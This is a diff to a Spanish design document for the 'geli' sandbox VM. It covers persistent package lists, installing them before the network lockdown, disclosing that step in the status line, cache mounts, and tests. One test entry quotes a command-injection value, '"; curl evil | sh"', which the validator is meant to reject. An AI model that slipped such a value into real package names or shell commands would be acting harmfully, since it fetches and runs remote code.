@@ -174,10 +174,13 @@ Un agente que necesita `ripgrep` o `jq` lo instala, y la sesión siguiente no lo
   "history": true,
   "packages": {
     "apk": ["ripgrep", "jq"],
-    "npm": ["prettier"]
+    "npm": ["prettier"],
+    "pip": ["httpx"]
   }
 }
 ```
+
+`pip` está porque su caché ya existía: dejarlo fuera habría sido arbitrario, no conservador.
 
 Se instala en cada arranque desde caché local. La raíz sigue siendo desechable, lo que el agente
 ensucie se tira, y la lista sobrevive a reconstrucciones de capa y de base porque no es una imagen:
@@ -188,17 +191,46 @@ declarara.** Esa sesión lo tiene; la siguiente no, hasta que alguien lo escriba
 el precio de que el resultado sea reproducible en vez de acumulado — y el mismo trato que `geli` ya
 le da al resto de la configuración del guest.
 
-### Hace falta compartir la caché de apk
+### El orden es lo que hace que esto funcione
 
-Hoy hay dos 9p de caché, `~/.cache/geli-sandbox/{npm,pip}`. Sin un tercero para `apk`
-(`/etc/apk/cache` en el invitado), cada arranque se bajaría los paquetes otra vez por red, lo que
-convierte una lista de tres paquetes en varios segundos de arranque y en una dependencia de la red
-para empezar a trabajar. Es la misma razón por la que existen los otros dos.
+En `mounts.sh`, como root: **mounts → paquetes → lockdown → marca de preparado.**
 
-### Dónde corre, y qué pasa si falla
+Lo estrecho no es la marca, es el lockdown. En cuanto corre no hay ruta por defecto, `resolv.conf`
+está vacío y el `nftables` de denegación por defecto sólo deja pasar el puerto del proxy: un
+paquete pedido después de eso no se puede bajar. Y como una instalación fallida sólo avisa,
+tampoco fallaría de forma ruidosa — arrancarías sin tus herramientas y el motivo sería una línea
+en un log de consola que nadie lee. `packages_install_before_egress_is_cut` existe por eso.
 
-En `mounts.sh`, como root, **antes de la marca de preparado**: un agente que arranca antes de tener
-sus herramientas es exactamente el problema que esto venía a resolver.
+Es la misma clase de orden cargante que CLAUDE.md ya documenta para el propio lockdown: ruta,
+ruleset, sudo.
+
+### Bajo `--restrict-net`, el bloque de estado lo dice
+
+De lo anterior se sigue algo que no se puede dejar implícito: en una sesión restringida, estos
+paquetes son **lo único** que se busca fuera de la lista de permitidos, porque se bajan antes del
+cierre. La línea `net restricted · N domains allowed` daría a entender lo contrario, así que
+debajo va:
+
+```
+  net    restricted · 9 domains allowed
+  tools  apk ripgrep jq · npm prettier · fetched before the egress lockdown
+```
+
+La regla del proyecto es que la línea de estado no mienta ni por omisión. Si esto resulta
+inaceptable, la alternativa no es callarlo: es no instalar nada bajo `--restrict-net` y decirlo.
+
+### Las cachés, y por qué hay que apuntar a ellas
+
+Hoy hay dos 9p de caché, `~/.cache/geli-sandbox/{npm,pip}`. Hace falta un tercero para `apk`, que
+se monta en `/var/cache/apk` con `/etc/apk/cache` enlazado ahí — Alpine no trae ese enlace y sin
+él apk no cachea nada.
+
+Y un detalle que anula las tres si se pasa por alto: **las instalaciones corren como root, y la
+caché de root no es la del usuario `sandbox`.** Sin `--cache` y `--cache-dir` explícitos, cada
+arranque se volvería a bajar lo que ya está en el disco del host, que es justamente lo que esas
+comparticiones existen para evitar.
+
+### Qué pasa si falla
 
 Un paquete que no instala **avisa y sigue**, no apaga la VM. El contraste es con el cierre de red,
 que sí apaga: ahí el bloque de estado ya ha afirmado que el egress está restringido y seguir sería
@@ -288,9 +320,18 @@ podar. Con `brain/` creciendo a 1.3 GB en el host, no es teórico.
 - `history_paths_are_guest_only` — ninguna ruta persistida sale del árbol del guest ni menciona el
   home del host.
 - `history_is_opt_in` — sin el ajuste en `.geli.json`, no se engancha ningún disco.
+- `packages_install_before_egress_is_cut` — el orden de §5, más que las instalaciones apunten a
+  las cachés y que un fallo no apague la VM.
 - `package_names_reject_shell_metacharacters` — `"; curl evil | sh"` no llega al guest.
 - `local_config_without_packages_still_parses` — gemelo del que ya existe para `allow`: los
   `.geli.json` que hay en disco siguen cargando.
+- `no_packages_means_no_install_step` — sin nada declarado, el script es el de antes.
+- `status_block_discloses_packages_fetched_before_the_lockdown` — y la línea va debajo de `net`.
+- `session_cloud_init_parses`, extendido con una lista declarada: las instalaciones entran en el
+  mismo bloque literal que los montajes, y ese bloque es donde el documento se rompió una vez.
+
+**§5 está implementado; §4 no.** Las marcas de arriba que hablan del disco de historial siguen
+siendo el plan.
 
 ---
 
